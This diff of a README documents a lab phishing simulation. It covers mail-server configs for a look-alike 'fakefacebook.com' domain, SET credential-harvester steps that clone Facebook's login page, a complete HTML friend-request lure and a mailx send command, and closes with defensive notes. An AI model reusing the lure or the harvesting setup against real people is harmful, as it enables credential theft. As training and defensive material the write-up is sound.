@@ -1,107 +1,304 @@
-# Spoofing-y-phising-con-mailserver-
-Este proyecto es únicamente con fines educativos y con la intención de ampliar mi portafolio. 
+# Email Spoofing & Phishing Simulation — Custom Mail Server + SET
 
-Aqui se documentara una guia detallada de como hacer una SIMULACION  de como se veria un ataque real de spoofing y phishing. Como herramientas para este proyecto se usaron 2 maquinas virtuales, una que sera la del servidor de correos(smtp) para la cual se usaron las sigientes aplicaciones:
+**Environment:** Fully local lab (VirtualBox/VMware, isolated network)
+**Category:** Social Engineering, Email Infrastructure, Phishing Simulation
+**Disclaimer:** This project was built entirely in a local, isolated lab for educational purposes. No real domains, real users, or production systems were targeted at any point.
 
-Roundcube: Esta es la que nos va a aydar a tener una interfaz de correo electronico con buzon y todo para poder enviar mensaje, esto se uso unicamente por estetica pero facilmente puede funcionar sin esto
+---
 
-Dovecot: Este se va a usar para que se pueda hacer un almacenamiento de correos electronicos en el cual roundcube pueda accer para poder hacer el mailbox del usuario
+## Summary
 
-Postfix: Este es el que se va a encargar del proceos de enrutar, entregar y recibir correos electronicos
+This project simulates a realistic phishing campaign end-to-end: a fully functional mail server was built from scratch to send convincing spoofed email, paired with a cloned phishing landing page to harvest credentials — replicating the two core components of a real-world business email compromise / credential phishing attack.
 
-Mailx: Este se uso para realizar pruebas antes de roundcube y poder hacer envio por linea de comando
+Two virtual machines were used:
 
-BIND9: Se uso para resolver los nombres de dominio y poder acceder al correo con fakefacebook.com
+| Role | Host | IP |
+|---|---|---|
+| Attacker (Parrot OS) | — | `192.168.1.9` |
+| Mail Server (Ubuntu Server) | `mail.fakefacebook.com` | `192.168.1.8` |
+| Victim (Ubuntu Desktop) | — | `192.168.1.10` |
 
-Dicho ya lo que se va a usar empezamos con el paso a paso:
+**Attack chain:**
+1. Stood up a complete SMTP/IMAP mail infrastructure (Postfix + Dovecot + BIND9 + Roundcube) under a fake domain, `fakefacebook.com`.
+2. Used the **Social Engineer Toolkit (SET)** to clone Facebook's login page and host it on the attacker machine.
+3. Crafted an HTML phishing email impersonating a "Facebook friend request" notification, sent from the spoofed domain.
+4. Delivered it to the victim's mailbox via Roundcube webmail.
+5. Victim clicks the embedded link → lands on the cloned Facebook login page → enters credentials → **SET captures them in plaintext on the attacker machine.**
 
-El proceso realizado fue el siguiente en una máquina virtual de ubuntu server se montaron los siguientes programas postfix como web mail server, mailx para poder hacer envíos y pruebas, dovecot que también es un servicio de webmail pero este nos permite el tema de almacenar y acceder a los correos almacenados por medio de IMAP y POP3 y roundcube el cual se utilizó para poder tener una interfaz gráfica. Además de esto se implementó un servidor DNS con BIND9 para poder usar los dominios “mail.fakefacebook.com” para poder ingresar a la interfaz gráfica desde una VM aparte, cabe recalcar que toda la configuración se hizo localmente por medio de bridge dejare a continuacion las redes usadas:
+---
 
+## 1. Mail Server Infrastructure
 
-VM atacante  == Parrot ( 192.168.1.9)
-VM smtp == Ubuntu server ( 192.168.1.8)
-VM víctima == Ubuntu (192.168.1.10)
+To make the phishing email land in a real mailbox and appear to originate from a legitimate-looking domain, a full mail stack was built rather than relying on a third-party SMTP relay.
 
-Continuando explicare como se configuró cada uno de las aplicaciones
+### 1.1 Postfix — SMTP (Mail Transfer Agent)
 
-Postfix: La instalación de postfix es la más importante pues este es el servidor de correo pero que es en sí: Postfix nos permite la transferencia de correo la cual su funcionalidad es enrutar y entregar correos en sistemas  Unix y Linux. Se eligió postfix pues este maneja una configuración sencilla, la cual se explicará a continuación.
+Postfix handles routing, delivery, and receipt of mail. During installation, the **System Mail Name** was set to define the domain identity of outgoing mail — later matched to the BIND9 zone configured for the same domain.
 
-como primer paso se realizó la instalación de
-sudo apt-install postfix 
+![Postfix initial configuration](screenshots/01-postfix-config.png)
 
-en este punto se va abrir una interfaz en la cual tendremos que elegir nuestro System mail name este es muy importante pues esto es literal lo que define el @dominiodecorreo.com y este era el mismo que se iba a configurar en el BIND9 dns despues en este caso se uso fakefacebook.com
+Key directives in `/etc/postfix/main.cf`:
 
-<img width="551" height="283" alt="{48913169-EBE2-4DAD-915C-7C55A9674EF6}" src="https://github.com/user-attachments/assets/1a4633f2-9b65-4e60-8065-4bc158c1f490" />
+```
+myhostname = fakefacebook.com
+myorigin = /etc/mailname
+inet_interfaces = all
+inet_protocols = all
 
-ya después de esto se crearon los usuarios de correo en este caso bob y alice para poder hacer los envíos de prueba se usó mailx siendo así que ya quedaria el postfix un ejemplo de uso es este
+mydestination = $myhostname, $mydomain, localhost, fakefacebook.com, smtp.fakefacebook.com, www.fakefacebook.com
+mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128 192.168.1.0/24
+smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination
 
-<img width="568" height="169" alt="{6ACB74DA-EA7C-465D-B22F-262CEA737553}" src="https://github.com/user-attachments/assets/147f75c9-bfd6-4b92-93d8-b0efda9ddd96" />
+smtpd_tls_security_level = may
+smtpd_tls_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
+smtpd_tls_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
 
-sin embargo, esto después cambiará pues esa ruta para ver los mails cambia cuando implementamos el dovecot pues al implementar roundcube tenemos que hacer los correos los almacene dovecot para así hacer que roundcube acceda a esto para poder hacer el mailbox siendo así como pasamos a la configuración de dovecot la cual es muy sencilla 
+home_mailbox = Maildir/
+```
 
-sudo apt-install dovecot-pop3
+![Postfix main.cf detailed config](screenshots/02-postfix-maincf.png)
 
-una vez instalado dovecot no dirigimos a la carpeta nano/etc/postfix/main.cf con el fin de cambiar las siguientes configuraciones
+`mynetworks` was scoped to the lab subnet (`192.168.1.0/24`) to keep relay permissions contained to the lab, and `home_mailbox = Maildir/` was set so each user's mail lands in Maildir format — required for Dovecot to serve it via IMAP/POP3 afterward.
 
-<img width="708" height="275" alt="{2CED6988-349A-429C-A1D6-38B49750B3E7}" src="https://github.com/user-attachments/assets/54cecbd0-513a-4d98-8db4-974055a64d80" />
+### 1.2 Dovecot — IMAP/POP3 (Mail Delivery & Storage)
 
-aquí evidenciamos que se cambió la ruta de guardado del mailbox en postfix para que después roundcube pueda acceder a estos y el cambio en dovecot está en la carpeta nano/etc/dovecot/conf.d/10-mail.conf
+Dovecot was layered on top of Postfix to allow Roundcube (and any IMAP/POP3 client) to actually read and store mail per-user, rather than relying on raw mbox access.
 
-<img width="602" height="176" alt="{A34E34BA-876C-408C-85C1-7B0640A187E9}" src="https://github.com/user-attachments/assets/8d3f5973-4e5a-4bc5-a922-ed721816fecc" />
+```
+mail_location = maildir:~/Maildir
+```
 
-Aquí pasamos al paso mas importante y que mas se dificulto pues es la configuracion del DNS se tuvo dificultades pues la documentación de como hacer este servidor era un poco confusa y la IA no fue de ayuda. Este servidor nos ayudó a que primero pudiéramos ingresar con el dominio mail.fakefacebook.com y que el roundcube pudiera conectarse al postfix para poder hacer el envío de los correos por @fakefacebook.com.
+![Dovecot mail_location configuration](screenshots/03-dovecot-mail-location.png)
 
-<img width="703" height="389" alt="{2327B393-31A1-4EEB-B422-E849B1C533B9}" src="https://github.com/user-attachments/assets/e3289514-933d-4883-ba85-e4cba45ac2a7" />
+This was configured in `/etc/dovecot/conf.d/10-mail.conf` to match the `Maildir/` format Postfix was writing to.
 
-En esta configuración las partes importantes son los host principales que son las formas de poder acceder al dominio y la parte de  las estaciones de trabajo que iban a ser la VM que van conectadas al DNS para poder recibir los correos, aquí el nombre de servidor más importante es el mail pues fue el que se configuró después en roundcube para el acceso y la creación de la página con apache
+### 1.3 BIND9 — DNS
 
-Ya por último y de los pasos más largos pero sencillos pasamos a la instalación de roundcube. Para la instalación de roundcube es indispensable tener MYSQL instalado pues roundcube necesita acceder a una DB para poder acceder a los correos y almacenarlos entonces se instalo mysql y despues se instalo el servicio de imapd de dovecot que también va de la mano con el almacenamiento de correos pero para que las VM puedan acceder a sus mailbox.
+This was the most fragile part of the build. A custom DNS zone was authored for `fakefacebook.com`, defining the records needed for mail routing and web access to resolve entirely within the lab network:
 
-Ahora si se procedió con la instalación de roundcube el cual salta una interfaz en el cual tenemos que decirle si tenemos el MYSQL activado y nada más. Después se procedió a hacer la configuracion del apache con roundcube para esto se usó el comando cd/etc/apache2/sites-available/ para encontrar la configuración por defecto de apache se hizo un copy de este archivo con el nombre de round.conf y ahí se hizo la siguiente config
+```bind
+$ORIGIN fakefacebook.com.
+$TTL 86400
+@ IN SOA ns1.fakefacebook.com. admin.fakefacebook.com. (
+    2025081007 ; Serial
+    3600       ; Refresh
+    1800       ; Retry
+    604800     ; Expire
+    86400 )    ; Minimum TTL
 
-<img width="594" height="402" alt="{C217460D-F436-449E-BC04-A440430AFB96}" src="https://github.com/user-attachments/assets/d103a7a8-9cd1-4ad7-a592-db12d4fb3bdf" />
+; Name servers
+@       IN NS   ns1.fakefacebook.com.
 
-Aquí se asignó el nombre de acceso del servidor el cual es mail.fakefacebook.com y en la parte final para dar acceso total de privilegios que es una solución de error de permisos. Después en el a2ensite round conf se inicializó para crear el apache y después para crear el enlace simbólico y después agregarlo al DNS bind9 como ya se mostró.
+; Core hosts
+ns1     IN A    192.168.1.8
+www     IN A    192.168.1.8
+mail    IN A    192.168.1.8
+smtp    IN A    192.168.1.8
+imap    IN A    192.168.1.8
+pop3    IN A    192.168.1.8
 
-Como último paso de esto se configuro el archivo nano /etc/roundcube/config.inc.ph con el fin de establecer la conexión de roundcube con el postfix
+; Clients / workstations
+ens33   IN A    192.168.1.9
+cliente2 IN A   192.168.1.10
 
-<img width="718" height="486" alt="{E5EA6ED3-B345-49EC-A466-BD40F95D1E5A}" src="https://github.com/user-attachments/assets/5f4a464a-8fd0-4519-b6a5-80fc8cf50222" />
+; MX record for the domain
+@ IN MX 10 mail.fakefacebook.com.
 
-aquí se cambiaron varias cosas pues roundcube ha tenido problemas con este archivo y las versiones entonces se tuvo que cambiar el de autenticación que usaba para acceder al smtp y poner el host que es fakefacebook:25, puesto 25 pues este es el usa por defecto postfix, algo para aclarar es que este puerto va a variar según el protocolo que se use como se usa el por defecto se usa el 25 pero si digamos fuera ssl se tiene que usar el 465. con esto terminaría la configuración del roundcube a continuación una imagen del resultado.
+; SPF record permitting mail.fakefacebook.com to send mail
+@ IN TXT "v=spf1 mx a:mail.fakefacebook.com -all"
+```
 
-<img width="705" height="328" alt="{8D73DE7D-49C4-42F8-858A-2EDBC6483C6B}" src="https://github.com/user-attachments/assets/f4aadf59-3fb1-49f1-8ff5-5c72885e685e" />
-Ahora pasamos a la parte de campaña blanca y la implementación del SET de facebook, se decidió unificar estos dos puntos con el fin de simular un ataque real, cabe recalcar que todo se hizo en un ambiente local.
+![BIND9 zone file configuration](screenshots/04-bind9-zone-file.png)
 
-Esta parte fue la más sencilla pues el sistema operativo ya sea PARROT o KALI  tiene la aplicacion SET (social engineer toolkit), la cual es una aplicación que tiene muchas herramientas para ataques de ingeniería social en este caso suplantación para esto simplemente se abre la app y se despliega el siguiente menú.
+The **MX record** tells any resolver that mail for `fakefacebook.com` should route to `mail.fakefacebook.com`, and the **SPF record** was added so the domain itself appears to authorize that mail server to send on its behalf — a detail real attackers sometimes configure to reduce the chance of landing in spam.
 
-<img width="398" height="326" alt="{301FE28D-5E3C-426B-A567-8A8053E32ACF}" src="https://github.com/user-attachments/assets/79e1ca00-0d8b-4f94-99c3-98b209ec8d11" />
+### 1.4 Validating the Mail Path
 
-Se selecciona el número 2 y se desplegará esto
+Before introducing the GUI layer, raw command-line mail was used to confirm Postfix could send and receive correctly between local accounts:
 
-<img width="378" height="201" alt="{06821387-9190-4140-9F1C-C309F30C7962}" src="https://github.com/user-attachments/assets/bd01f2eb-bae7-4ba8-9edb-3ab65c68903f" />
+```bash
+mail alice
+Subject: prueba
+es una prueba
+Cc: bob@fakefacebook.com
+```
 
-Donde se elige el 3 y ya solo es cuestión de seleccionar site cloner y rellenar
+![mailx test send between local accounts](screenshots/05-mailx-test-send.png)
 
-<img width="606" height="236" alt="{07113FCB-9B28-45D1-8CC9-D29A5F286B42}" src="https://github.com/user-attachments/assets/fea8bd7b-34a4-413b-acba-ac797deb9022" />
+### 1.5 Apache + Roundcube — Webmail Interface
 
-la forma de acceso es por la ip de la VM en este caso 192.168.1.9, para poder implementarlo a la campaña de correo balnco esta ip es importante pues será el botón de redirección en el correo con el HTML configurado.
+A graphical webmail client (Roundcube) was added for realism and ease of use — mail server access via raw CLI is not how a real phishing target would interact with their inbox.
 
-<img width="604" height="200" alt="{9B9902E6-9D90-4CAE-ABC4-ABC30BAC1B04}" src="https://github.com/user-attachments/assets/e887268d-1149-472b-9c32-0b6825a2d2c8" />
+Apache virtual host (`/etc/apache2/sites-available/round.conf`):
 
-el cual este ya después se hizo el envío respectivo
+```apache
+<VirtualHost *:80>
+    ServerName mail.fakefacebook.com
+    ServerAdmin webmaster@localhost
+    DocumentRoot /var/lib/roundcube
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
 
-<img width="604" height="283" alt="{A6727766-654C-4E02-A8E7-DB39F40D6561}" src="https://github.com/user-attachments/assets/68090e0c-d165-4118-a4ee-becf6741a567" />
+<Directory /var/lib/roundcube>
+    Require all granted
+</Directory>
+```
 
-viéndose así en el envío
+![Apache virtual host for Roundcube](screenshots/06-apache-vhost-roundcube.png)
 
-<img width="603" height="381" alt="{9EB23276-99E5-4DD5-A01E-E5AC28D42E9F}" src="https://github.com/user-attachments/assets/30b6baeb-bbc6-4ab8-bf55-52766f7c8af0" />
+Roundcube was then pointed at the local Postfix instance in `config.inc.php`:
 
-Así se ve el envío en roundcube pero también se puede enviar de la siguiente forma por línea de código.
+```php
+$config['imap_host'] = ['localhost:143'];
+$config['smtp_host'] = 'fakefacebook.com:25';
+$config['smtp_user'] = '%u';
+$config['smtp_pass'] = '%p';
+```
 
-<img width="604" height="25" alt="{4D1AFCA0-4FC6-44F2-99A3-0CC8C01D4DEE}" src="https://github.com/user-attachments/assets/3415c69f-2080-4b19-9b4d-afd0311f58e5" />
+![Roundcube config.inc.php SMTP/IMAP settings](screenshots/07-roundcube-config.png)
 
-donde se utiliza directamente el postfix con mailx para poder adjuntar el HTML. Ya cuando el usuario abre el correo se ve así
+Port `25` (standard unencrypted SMTP submission) was used since the lab's Postfix instance does not enforce SMTPS; a production setup would use port `465` or `587` with TLS instead.
 
-<img width="606" height="211" alt="{6B445D0B-E9B8-4E23-9A4E-DAF6A3E83BB8}" src="https://github.com/user-attachments/assets/605d4b58-57b1-4edb-8529-6c8a32d55181" />
+**Result — fully functional webmail accessible at `mail.fakefacebook.com`:**
 
-Este seria un ejemplo de como utlizar un servidor mail y las herramientas de parrot para simular un ataque 
+![Roundcube webmail inbox showing received test messages](screenshots/08-roundcube-webmail-inbox.png)
+
+---
+
+## 2. Phishing Page — Social Engineer Toolkit (SET)
+
+With a working mail delivery path in place, the next step was the actual credential-harvesting payload: a cloned Facebook login page.
+
+### 2.1 Selecting the Attack Vector
+
+SET's main menu was used to select **Website Attack Vectors**, then **Credential Harvester Attack Method**, which serves a cloned page and logs any form submission to it.
+
+![SET main menu — option 2, Website Attack Vectors](screenshots/09-set-menu-main.png)
+
+![SET web attack sub-menu — Credential Harvester selected](screenshots/10-set-web-attack-methods.png)
+
+### 2.2 Cloning the Target Page
+
+The **Site Cloner** option was used to pull a live copy of Facebook's login page, configuring the attacker IP (`192.168.1.9`) as the address that captured credentials POST back to:
+
+```
+[-] IP address for the POST back in Harvester/Tabnabbing [192.168.1.9]:www.facebook.com
+[-] Enter the url to clone:www.facebook.com
+```
+
+![SET Site Cloner configuration with target URL](screenshots/11-set-site-cloner-config.png)
+
+SET then hosts an exact visual replica of the real Facebook login page on the attacker's machine, with the underlying form action silently rewritten to submit to the attacker's listener instead of Facebook's real servers.
+
+---
+
+## 3. Phishing Email — Delivery
+
+### 3.1 Crafting the Lure
+
+An HTML email was built to impersonate a Facebook "friend request" notification — a low-friction, plausible pretext that creates curiosity without raising suspicion the way an urgent security alert might.
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Solicitud de amistad</title>
+</head>
+<body style="font-family: Arial, sans-serif; background-color: #f0f2f5; padding: 20px;">
+  <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 8px; padding: 20px;">
+    <h2 style="color: #1877f2;">facebook</h2>
+    <p><strong>Juan Pérez</strong> te ha enviado una solicitud de amistad.</p>
+    <a href="http://192.168.1.9" target="_blank"
+       style="display:inline-block; padding:10px 20px; background-color:#1877f2; color:#ffffff;
+              text-decoration:none; border-radius:6px; font-weight:bold;">
+      Ver solicitud
+    </a>
+    <p style="margin-top: 40px; font-size: 12px; color: #65676b;">
+      Este correo fue enviado por Facebook Clone, Inc. — 1601 Fake St, Bogotá, Colombia
+    </p>
+  </div>
+</body>
+</html>
+```
+
+![HTML source of the phishing email](screenshots/12-html-email-source.png)
+
+The embedded link points directly to the attacker's IP (`192.168.1.9`), where SET's cloned page is listening.
+
+### 3.2 Sending via Roundcube
+
+The email was composed and sent through the legitimate-looking webmail interface, from `alice@fakefacebook.com`:
+
+![Composing the phishing email in Roundcube](screenshots/13-roundcube-compose-phish.png)
+
+### 3.3 Sending via Command Line (Alternative Method)
+
+The same HTML payload was also sent directly through Postfix using `mailx`, demonstrating that delivery does not depend on the GUI client:
+
+```bash
+cat solicitud.html | mailx -a "Content-Type: text/html" -s "Nueva solicitud de amistad" alice@fakefacebook.com
+```
+
+![Sending the HTML phishing email via mailx CLI](screenshots/15-mailx-html-send-cli.png)
+
+### 3.4 Victim's View
+
+From the victim's mailbox, the email renders as a convincing Facebook notification, indistinguishable at a glance from a legitimate one:
+
+![Phishing email as received in the victim's inbox](screenshots/14-phishing-email-received.png)
+
+---
+
+## 4. Credential Harvesting
+
+When the victim clicks **"Ver solicitud,"** they are taken to SET's cloned Facebook login page — a pixel-identical replica hosted on the attacker's machine:
+
+![Cloned Facebook login page capturing entered credentials](screenshots/16-cloned-login-page-credentials.png)
+
+Once the victim enters their username and password and submits the form, SET intercepts the POST request server-side and logs the credentials in plaintext to the attacker's terminal — completing the attack chain from email delivery to credential theft.
+
+---
+
+## 5. Attack Chain Summary
+
+| Stage | Component | Purpose |
+|---|---|---|
+| 1 | Postfix + BIND9 + SPF record | Establish a domain capable of sending mail that passes basic legitimacy checks |
+| 2 | Dovecot + Roundcube | Realistic webmail delivery and victim-side mailbox experience |
+| 3 | SET — Site Cloner | Produce a visually identical credential-harvesting login page |
+| 4 | HTML phishing email | Low-friction social engineering pretext (friend request) to drive clicks |
+| 5 | SET — Credential Harvester | Capture submitted credentials in plaintext |
+
+## 6. Detection & Defense Notes
+
+Building this lab end-to-end also surfaced the exact signals defenders should look for:
+
+1. **SPF/DKIM/DMARC enforcement.** This lab's domain published an SPF record permitting its own server to send — in the real world, the *receiving* domain (e.g., the real facebook.com) has no relationship to an attacker-registered look-alike domain, so strict SPF/DKIM/DMARC alignment checks on the receiving side would flag or reject spoofed mail from a domain like `fakefacebook.com` claiming to represent Facebook.
+2. **Look-alike domain detection.** `fakefacebook.com` is a textbook typosquat/cousin-domain pattern. Mail filtering and brand-protection tooling specifically watch for domains that visually or semantically impersonate high-value brands.
+3. **Link inspection before clicking.** The phishing link in this lab pointed to a raw IP address (`192.168.1.9`) rather than any `facebook.com` subdomain — a major red flag that's easy to teach end users to check (hover before you click).
+4. **TLS certificate mismatch.** A cloned page hosted by an attacker will not have a valid certificate for the real brand's domain; user training and browser warnings are the primary control here.
+5. **Credential harvester traffic patterns.** SET's cloned pages typically redirect to the real site after capture — but the page itself is served from infrastructure with no legitimate certificate or hosting history, which is detectable by URL reputation and sandboxing tools used in real SOC/MSSP environments.
+6. **User reporting culture.** The single highest-leverage defense against this entire attack chain is a workforce trained to report suspicious "friend request" or notification-style emails rather than act on them — this is the control that actually breaks the chain before any technical control needs to.
+
+---
+
+## Tools Used
+
+- **Postfix** — SMTP mail transfer agent
+- **Dovecot** — IMAP/POP3 mailbox server
+- **BIND9** — authoritative DNS for the spoofed domain
+- **Roundcube** — webmail client (PHP/MySQL)
+- **Apache2** — web server hosting Roundcube
+- **Social Engineer Toolkit (SET)** — site cloning and credential harvesting
+- **mailx** — command-line mail testing and delivery
+
+## Skills Demonstrated
+
+- End-to-end mail server infrastructure (SMTP, IMAP, DNS, MX/SPF records)
+- DNS zone authoring and troubleshooting (BIND9)
+- Social engineering / phishing campaign design and execution
+- HTML email crafting for social engineering pretexts
+- Credential harvesting mechanics and detection awareness
+- Translating an offensive exercise into concrete defensive recommendations
